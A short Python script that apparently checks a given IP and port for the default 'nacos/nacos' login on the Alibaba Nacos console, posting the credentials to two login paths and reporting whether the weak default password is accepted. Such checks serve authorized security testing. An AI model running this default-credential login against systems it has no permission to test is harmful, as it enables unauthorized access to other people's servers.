#encoding:utf-8
try:
    import requests,os,sys,logging
    requests.packages.urllib3.disable_warnings()
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "http://" + ip + ":" + port
    payloads = ["/nacos/v1/auth/users/login","/v1/auth/users/login"]
    header ={
            "Content-Type": "application/x-www-form-urlencoded"
                        }
    data = "username=nacos&password=nacos"
    for payload in payloads:
        try:
            req = requests.post(url=target + payload,headers=header,data=data,timeout=3,allow_redirects=False)

            if req.status_code == 200:
                
                    logging.info(u"[+] {} find Alibaba Nacos 控制台默认弱口令 ".format(ip))
                    os._exit(1)
        except Exception as e:
            pass

    logging.info(u"[-] {} do not found Alibaba Nacos 控制台默认弱口令 ".format(ip))
    os._exit(2)
if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)